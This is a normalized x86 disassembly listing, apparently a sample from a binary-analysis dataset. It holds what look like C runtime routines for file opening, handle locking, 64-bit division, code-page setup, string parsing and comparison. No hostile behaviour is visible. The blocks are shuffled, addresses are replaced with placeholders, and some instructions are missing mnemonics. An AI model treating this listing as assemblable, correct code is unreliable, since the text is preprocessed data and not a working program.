cmp eax [ rw-data ]
jae r-xdata
call sub_406dfe
mov [ eax ] 0x9
call sub_406e07
and [ eax ] 0x0
or eax 0xffffffff
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea eax [ eax + eax * 8 ]
mov ecx [ ecx * 4 + rw-data ]
test [ ecx + eax * 4 + 0x4 ] 0x1
lea eax [ ecx + eax * 4 ]
je r-xdata
mov eax [ eax ]
retn
sub_40bdc5
mov eax [ esp + 0x4 ]
push ebx
mov ecx eax
and eax 0x1f
sar ecx 0x5
push esi
push edi
mov esi [ ecx * 4 + rw-data ]
lea ebx [ ecx * 4 + rw-data ]
lea edi [ eax + eax * 8 ]
shl edi 0x2
add esi edi
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov eax [ ebx ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
pop edi
pop esi
pop ebx
retn
push 0x11
call sub_406d15
cmp [ esi + 0x8 ] 0x0
pop ecx
jne r-xdata
push 0x11
call sub_406d76
pop ecx
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSection@IAT ]
inc [ esi + 0x8 ]
sub_40be46
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jb r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea eax [ eax + eax * 8 ]
mov ecx [ ecx * 4 + rw-data ]
mov al [ ecx + eax * 4 + 0x4 ]
and eax 0x40
retn
xor eax eax
retn
sub_40be70
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_40bee0
push ebx
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov eax [ esp + 0x8 ]
div ecx
mov eax edx
xor edx edx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov ecx eax
mul [ esp + 0x14 ]
xchg ecx eax
mul [ esp + 0x10 ]
add edx ecx
jb r-xdata
pop ebx
retn 0x10
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_40bf55
push ebp
mov ebp esp
sub esp 0x1c
mov ecx [ ebp + 0xc ]
push ebx
xor ebx ebx
push esi
test cl 0x80
push edi
mov [ ebp - 0x1c ] 0xc
mov [ ebp - 0x18 ] ebx
je r-xdata
and [ ebp - 0x1 ] 0x0
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
push 0x3
mov eax ecx
pop esi
and eax esi
sub eax ebx
je r-xdata
test ch 0x40
jne r-xdata
mov eax 0x8000
test eax ecx
jne r-xdata
mov [ ebp - 0xc ] 0x80000000
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x10 ] ebx
cmp eax 0x20
je r-xdata
mov [ ebp - 0xc ] 0x40000000
jmp r-xdata
dec eax
jne r-xdata
cmp ecx 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
cmp eax 0x30
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax 0x10
je r-xdata
call sub_406dfe
mov [ eax ] 0x16
call sub_406e07
mov [ eax ] ebx
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0xc ] 0xc0000000
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
cmp ecx 0x600
je r-xdata
mov [ ebp - 0x8 ] esi
jmp r-xdata
cmp ecx ebx
je r-xdata
mov edx 0x700
mov eax 0x400
and ecx edx
mov edi 0x100
cmp ecx eax
jg r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
cmp eax 0x40
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
test al 0x40
je r-xdata
mov ecx [ rw-data ]
not ecx
and ecx [ ebp + 0x14 ]
test cl 0x80
jne r-xdata
mov [ ebp - 0x8 ] 0x5
jmp r-xdata
cmp ecx edx
je r-xdata
mov eax [ ebp + 0xc ]
mov esi 0x80
test edi eax
je r-xdata
cmp ecx edi
je r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test ah 0x10
je r-xdata
or esi 0x4000000
or [ ebp - 0xa ] 0x1
push 0x1
pop esi
mov [ ebp - 0x8 ] 0x4
jmp r-xdata
cmp ecx 0x200
je r-xdata
test al 0x20
je r-xdata
or esi edi
cmp ecx 0x300
jne r-xdata
test al 0x10
je r-xdata
or esi 0x8000000
jmp r-xdata
mov [ ebp - 0x8 ] 0x2
jmp r-xdata
call sub_40bb65
mov ebx eax
or edi 0xffffffff
cmp ebx edi
jne r-xdata
or esi 0x10000000
push 0x0
push esi
push [ ebp - 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp + 0x8 ]
call [ CreateFileA@IAT ]
mov esi eax
cmp esi edi
jne r-xdata
call sub_406dfe
mov [ eax ] 0x18
call sub_406e07
and [ eax ] 0x0
mov eax edi
jmp r-xdata
push esi
call [ GetFileType@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
push eax
call sub_406d8b
pop ecx
mov esi edi
jmp r-xdata
cmp eax 0x2
jne r-xdata
push esi
call [ CloseHandle@IAT ]
jmp r-xdata
push ebx
call sub_40be24
pop ecx
mov eax esi
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
push esi
push ebx
call sub_40bc88
mov eax ebx
pop ecx
sar eax 0x5
pop ecx
mov cl [ ebp - 0x1 ]
lea edi [ eax * 4 + rw-data ]
mov eax ebx
or cl 0x1
and eax 0x1f
mov [ ebp + 0xb ] cl
lea esi [ eax + eax * 8 ]
mov eax [ edi ]
shl esi 0x2
and [ ebp + 0xb ] 0x48
mov [ eax + esi + 0x4 ] cl
jne r-xdata
or [ ebp - 0x1 ] 0x8
cmp [ ebp + 0xb ] 0x0
jne r-xdata
test cl 0x80
je r-xdata
mov esi ebx
test [ ebp + 0xc ] 0x8
je r-xdata
test [ ebp + 0xc ] 0x2
je r-xdata
mov eax [ edi ]
or [ eax + esi + 0x4 ] 0x20
lea eax [ eax + esi + 0x4 ]
push 0x2
push 0xffffffff
push ebx
call sub_409194
add esp 0xc
cmp eax 0xffffffff
mov [ ebp - 0x10 ] eax
jne r-xdata
and [ ebp + 0x13 ] 0x0
lea eax [ ebp + 0x13 ]
push 0x1
push eax
push ebx
call sub_408f56
add esp 0xc
test eax eax
jne r-xdata
call sub_406e07
cmp [ eax ] 0x83
je r-xdata
push 0x0
push 0x0
push ebx
call sub_409194
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x13 ] 0x1a
jne r-xdata
push ebx
call sub_407514
pop ecx
or esi 0xffffffff
jmp r-xdata
push [ ebp - 0x10 ]
push ebx
call sub_40ce3a
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
sub_40c29c
movzx eax [ esp + 0x4 ]
mov cl [ esp + 0xc ]
test [ eax + rw-data ] cl
jne r-xdata
push 0x1
pop eax
retn
cmp [ esp + 0x8 ] 0x0
je r-xdata
xor eax eax
movzx eax [ eax * 2 + rw-data ]
and eax [ esp + 0x8 ]
jmp r-xdata
retn
test eax eax
jne r-xdata
sub_40c2cd
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push 0x19
call sub_406d15
push [ ebp + 0x8 ]
call sub_40c47a
mov ebx eax
pop ecx
cmp ebx [ rw-data ]
pop ecx
mov [ ebp + 0x8 ] ebx
jne r-xdata
test ebx ebx
je r-xdata
xor esi esi
jmp r-xdata
call sub_40c4f7
xor edx edx
mov eax rw-data
push 0x19
call sub_406d76
pop ecx
mov eax esi
pop edi
pop esi
pop ebx
leave
retn
and [ ebp - 0x4 ] 0x0
push 0x40
pop ecx
xor eax eax
mov edi rw-data
lea esi [ edx + edx * 2 ]
[ edi ]
shl esi 0x4
stosb [ edi ]
lea ebx [ esi + rw-data ]
add eax 0x30
inc edx
cmp eax rw-data
jb r-xdata
inc [ ebp - 0x4 ]
add ebx 0x8
cmp [ ebp - 0x4 ] 0x4
jb r-xdata
mov dl [ ecx + 0x1 ]
test dl dl
je r-xdata
cmp [ eax ] ebx
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
push ebx
call [ GetCPInfo@IAT ]
push 0x1
pop esi
cmp eax esi
jne r-xdata
cmp [ ebx ] 0x0
mov ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] 0x1
push eax
mov [ rw-data ] eax
call sub_40c4c4
lea esi [ esi + rw-data ]
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop ecx
mov [ rw-data ] eax
movsd [ edi ] [ esi ]
jmp r-xdata
movzx eax [ ecx ]
movzx edi dl
cmp eax edi
ja r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x40
and [ rw-data ] 0x0
pop ecx
xor eax eax
mov edi rw-data
cmp [ ebp - 0x18 ] esi
[ edi ]
stosb [ edi ]
mov [ rw-data ] ebx
jbe r-xdata
call sub_40c520
jmp r-xdata
inc ecx
inc ecx
cmp [ ecx ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + rw-data ]
or esi 0xffffffff
and [ rw-data ] 0x0
cmp [ ebp - 0x12 ] 0x0
je r-xdata
or [ eax + rw-data ] dl
inc eax
cmp eax edi
jbe r-xdata
mov eax esi
lea ecx [ ebp - 0x11 ]
or [ eax + rw-data ] 0x8
inc eax
cmp eax 0xff
jb r-xdata
push ebx
call sub_40c4c4
pop ecx
mov [ rw-data ] eax
mov [ rw-data ] esi
jmp r-xdata
movzx eax [ ecx - 0x1 ]
movzx edx dl
xor eax eax
mov edi rw-data
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
inc ecx
inc ecx
cmp [ ecx - 0x1 ] 0x0
jne r-xdata
or [ eax + rw-data ] 0x4
inc eax
jmp r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
cmp eax edx
ja r-xdata
sub_40c47a
mov eax [ esp + 0x4 ]
and [ rw-data ] 0x0
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
jmp [ GetOEMCP@IAT ]
cmp eax 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
jmp [ GetACP@IAT ]
retn
mov eax [ rw-data ]
mov [ rw-data ] 0x1
sub_40c4c4
mov eax [ esp + 0x4 ]
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_40c4f7
push edi
push 0x40
pop ecx
xor eax eax
mov edi rw-data
[ edi ]
stosb [ edi ]
xor eax eax
mov edi rw-data
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
pop edi
retn
sub_40c520
push ebp
mov ebp esp
sub esp 0x514
lea eax [ ebp - 0x14 ]
push esi
push eax
push [ rw-data ]
call [ GetCPInfo@IAT ]
cmp eax 0x1
jne r-xdata
xor eax eax
mov esi 0x100
xor eax eax
mov esi 0x100
cmp eax 0x61
jb r-xdata
cmp eax 0x5a
ja r-xdata
mov [ ebp + eax - 0x114 ] al
inc eax
cmp eax esi
jb r-xdata
mov al [ ebp - 0xe ]
mov [ ebp - 0x114 ] 0x20
test al al
je r-xdata
and [ eax + rw-data ] 0x0
cmp eax 0x7a
ja r-xdata
or [ eax + rw-data ] 0x10
mov cl al
add cl 0x20
push 0x0
lea eax [ ebp - 0x514 ]
push [ rw-data ]
push [ rw-data ]
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x1
call sub_40cb0e
push 0x0
lea eax [ ebp - 0x214 ]
push [ rw-data ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push esi
push [ rw-data ]
call sub_40d11e
push 0x0
lea eax [ ebp - 0x314 ]
push [ rw-data ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x200
push [ rw-data ]
call sub_40d11e
add esp 0x5c
xor eax eax
lea ecx [ ebp - 0x514 ]
push ebx
push edi
lea edx [ ebp - 0xd ]
cmp eax 0x41
jb r-xdata
pop esi
leave
retn
or [ eax + rw-data ] 0x20
mov cl al
sub cl 0x20
jmp r-xdata
inc eax
cmp eax esi
jb r-xdata
test dl 0x2
je r-xdata
or [ eax + rw-data ] 0x10
mov dl [ ebp + eax - 0x214 ]
inc edx
inc edx
mov al [ edx - 0x1 ]
test al al
jne r-xdata
sub ecx eax
lea edi [ ebp + eax - 0x114 ]
inc ecx
mov eax 0x20202020
mov ebx ecx
shr ecx 0x2
[ edi ]
mov ecx ebx
and ecx 0x3
[ edi ]
mov [ eax + rw-data ] cl
jmp r-xdata
and [ eax + rw-data ] 0x0
or [ eax + rw-data ] 0x20
mov dl [ ebp + eax - 0x314 ]
jmp r-xdata
inc eax
inc ecx
inc ecx
cmp eax esi
jb r-xdata
movzx ecx [ edx ]
movzx eax al
cmp eax ecx
ja r-xdata
pop edi
pop ebx
mov dx [ ecx ]
test dl 0x1
je r-xdata
jmp r-xdata
mov [ eax + rw-data ] dl
jmp r-xdata
sub_40c6d8
push ebp
mov ebp esp
sub esp 0xc
push ebx
and [ ebp - 0x8 ] 0x0
push esi
push edi
mov edi [ ebp + 0x8 ]
mov bl [ edi ]
lea esi [ edi + 0x1 ]
mov [ ebp - 0x4 ] esi
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax 0x8
movzx eax bl
push 0x8
push eax
call sub_40d4a8
pop ecx
pop ecx
jmp r-xdata
cmp bl 0x2d
mov [ ebp - 0x4 ] esi
jne r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x14 ] 0x2
jmp r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
jl r-xdata
mov bl [ esi ]
inc esi
mov [ ebp - 0x4 ] esi
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
xor eax eax
mov [ eax ] edi
cmp eax 0x24
jg r-xdata
push 0x10
test eax eax
pop ecx
jne r-xdata
cmp [ ebp + 0x10 ] ecx
jne r-xdata
cmp bl 0x30
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
mov edi 0x103
mov [ ebp - 0xc ] eax
cmp bl 0x30
jne r-xdata
mov al [ esi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0xa
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax + esi * 2 ]
and eax 0x4
push 0x4
push esi
call sub_40d4a8
pop ecx
pop ecx
jmp r-xdata
mov al [ esi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] ecx
cmp al 0x58
je r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
test eax eax
je r-xdata
mov bl [ esi + 0x1 ]
inc esi
inc esi
mov [ ebp - 0x4 ] esi
cmp al 0x58
jne r-xdata
mov [ ebp + 0x10 ] 0x8
jmp r-xdata
mov eax [ rw-data ]
mov ax [ eax + esi * 2 ]
and eax edi
push edi
push esi
call sub_40d4a8
pop ecx
pop ecx
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax [ ebp + 0x14 ]
dec [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
test al 0x8
jne r-xdata
movsx eax bl
push eax
call sub_40d36d
pop ecx
mov ecx eax
sub ecx 0x37
test eax eax
je r-xdata
mov esi [ ebp - 0x8 ]
or [ ebp + 0x14 ] 0x8
cmp esi [ ebp - 0xc ]
jb r-xdata
test al 0x4
mov esi 0x7fffffff
jne r-xdata
test ebx ebx
je r-xdata
imul esi [ ebp + 0x10 ]
add esi ecx
mov [ ebp - 0x8 ] esi
jne r-xdata
call sub_406dfe
test [ ebp + 0x14 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x8 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x1
movzx esi bl
jle r-xdata
or [ ebp + 0x14 ] 0x4
jmp r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp ecx edx
jbe r-xdata
mov eax [ ebp + 0x14 ]
and al 0x2
neg al
sbb eax eax
neg eax
add eax esi
mov [ ebp - 0x8 ] eax
or [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
test ebx ebx
je r-xdata
and eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov bl [ eax ]
jmp r-xdata
test [ ebp + 0x14 ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] 0x80000000
ja r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
neg eax
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] esi
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_40c8e0
mov ecx [ esp + 0x8 ]
push edi
push ebx
push esi
mov dl [ ecx ]
mov edi [ esp + 0x10 ]
test dl dl
je r-xdata
mov eax edi
pop esi
pop ebx
pop edi
retn
mov dh [ ecx + 0x1 ]
test dh dh
je r-xdata
xor eax eax
pop esi
pop ebx
pop edi
mov al dl
jmp r-xdata
mov esi edi
mov ecx [ esp + 0x14 ]
mov al [ edi ]
inc esi
cmp al dl
je r-xdata
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
mov al [ esi ]
inc esi
cmp al dh
jne r-xdata
test al al
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
inc edx
cmp cl bl
je r-xdata
cmp al dl
je r-xdata
lea edi [ esi - 0x1 ]
pop esi
pop ebx
pop edi
xor eax eax
retn
mov al [ esi ]
inc esi
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
test al al
jne r-xdata
lea eax [ edi - 0x1 ]
pop esi
pop ebx
pop edi
retn
mov al [ esi ]
add esi 0x2
cmp al ah
jne r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
mov al [ ecx + 0x3 ]
test al al
je r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
mov ah [ esi - 0x1 ]
add ecx 0x2
cmp al ah
je r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
mov ah [ ecx + 0x2 ]
test ah ah
je r-xdata
jmp r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_40c960
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub_40c98f
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push ebx
call [ rw-data ]
call eax
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
test eax eax
mov [ rw-data ] eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
push ebx
call eax
mov ebx eax
sub_40ca18
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_406dfe
mov [ eax ] 0x9
call sub_406e07
and [ eax ] 0x0
or edx 0xffffffff
mov eax edx
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push ebx
push edi
push esi
call sub_40bdc5
push [ esp + 0x20 ]
push [ esp + 0x20 ]
push [ esp + 0x20 ]
push esi
call sub_40ca89
push esi
mov edi eax
mov ebx edx
call sub_40be24
add esp 0x18
mov eax edi
mov edx ebx
pop edi
pop ebx
pop esi
retn
sub_40ca89
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_40bd83
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
cmp eax edi
mov [ ebp - 0x8 ] eax
jne r-xdata
call sub_406dfe
mov [ eax ] 0x9
jmp r-xdata
mov eax esi
and esi 0x1f
sar eax 0x5
lea ecx [ esi + esi * 8 ]
mov eax [ eax * 4 + rw-data ]
and [ eax + ecx * 4 + 0x4 ] 0xfd
mov edx [ ebp - 0x4 ]
lea eax [ eax + ecx * 4 + 0x4 ]
mov eax [ ebp - 0x8 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
mov eax edi
mov edx edi
jmp r-xdata
push eax
call sub_406d8b
pop ecx
pop edi
pop esi
leave
retn
sub_40cb0e
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ rw-data ]
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp eax 0x2
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push 0x1
pop esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
cmp eax 0x1
jne r-xdata
mov eax [ ebp + 0x1c ]
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push esi
push r--data
push esi
push ebx
call [ GetStringTypeA@IAT ]
test eax eax
je r-xdata
mov eax esi
jmp r-xdata
xor eax eax
cmp [ ebp + 0x18 ] ebx
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call [ GetStringTypeA@IAT ]
jmp r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
push ebx
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebp + 0x20 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x20 ] eax
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x18 ] eax
lea esp [ ebp - 0x34 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] ebx
lea edi [ eax + eax ]
mov eax edi
add eax 0x3
and al 0xfc
call sub_40c960
mov [ ebp - 0x18 ] esp
mov esi esp
mov [ ebp - 0x24 ] esi
push edi
push ebx
push esi
call sub_405360
add esp 0xc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
cmp esi ebx
je r-xdata
push [ ebp - 0x20 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
cmp eax ebx
je r-xdata
push [ ebp + 0x14 ]
push eax
push esi
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
jmp r-xdata
sub_40cc60
push ebp
mov ebp esp
push edi
push esi
push ebx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
lea eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
[ rw-data ]
cmp [ rw-data ] 0x0
jg r-xdata
mov al 0xff
mov edi edi
[ rw-data ]
push 0x13
call sub_406d15
mov [ esp ] 0x1
push 0x0
jmp r-xdata
movsx eax al
jmp r-xdata
mov al [ esi ]
inc esi
mov ah [ edi ]
inc edi
cmp ah al
je r-xdata
mov ebx eax
pop eax
or eax eax
jne r-xdata
mov al [ esi ]
inc esi
mov bl [ edi ]
inc edi
cmp al bl
je r-xdata
mov eax 0xff
xor ebx ebx
nop
pop ebx
pop esi
pop edi
leave
retn
or al al
je r-xdata
sub al 0x41
cmp al 0x1a
sbb cl cl
and cl 0x20
add al cl
add al 0x41
xchg al ah
sub al 0x41
cmp al 0x1a
sbb cl cl
and cl 0x20
add al cl
add al 0x41
cmp al ah
je r-xdata
push 0x13
call sub_406d76
add esp 0x4
[ rw-data ]
jmp r-xdata
or al al
je r-xdata
push eax
push ebx
call sub_40d51d
mov ebx eax
add esp 0x4
call sub_40d51d
add esp 0x4
cmp bl al
je r-xdata
sbb al al
sbb al 0xff
mov eax ebx
sbb eax eax
sbb eax 0xffffffff
sub_40cd30
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
lea eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
[ rw-data ]
cmp [ rw-data ] 0x0
jg r-xdata
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
[ rw-data ]
mov ebx ecx
push 0x13
call sub_406d15
mov [ esp ] 0x1
mov ecx ebx
push 0x0
jmp r-xdata
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
xor ecx ecx
cmp eax ebx
je r-xdata
or ebx ebx
je r-xdata
xor eax eax
xor ebx ebx
mov edi edi
mov ecx 0xffffffff
jb r-xdata
inc esi
inc edi
cmp ah bh
jb r-xdata
pop eax
or eax eax
jne r-xdata
mov ecx 0xffffffff
jb r-xdata
inc esi
inc edi
push ecx
push eax
push ebx
call sub_40d51d
mov ebx eax
add esp 0x4
call sub_40d51d
add esp 0x4
pop ecx
cmp eax ebx
jne r-xdata
neg ecx
jmp r-xdata
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
mov ebx ecx
push 0x13
call sub_406d76
add esp 0x4
mov ecx ebx
[ rw-data ]
jmp r-xdata
neg ecx
dec ecx
jne r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
mov al [ esi ]
or eax eax
mov bl [ edi ]
je r-xdata
dec ecx
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_40ce3a
push ebp
mov ebp esp
mov eax 0x1004
call sub_40c960
push ebx
push esi
xor esi esi
push 0x1
push esi
push [ ebp + 0x8 ]
call sub_409194
or ebx 0xffffffff
add esp 0xc
cmp eax ebx
mov [ ebp - 0x4 ] eax
je r-xdata
mov eax ebx
push 0x2
push esi
push [ ebp + 0x8 ]
call sub_409194
add esp 0xc
cmp eax ebx
je r-xdata
push edi
mov edi [ ebp + 0xc ]
sub edi eax
test edi edi
jle r-xdata
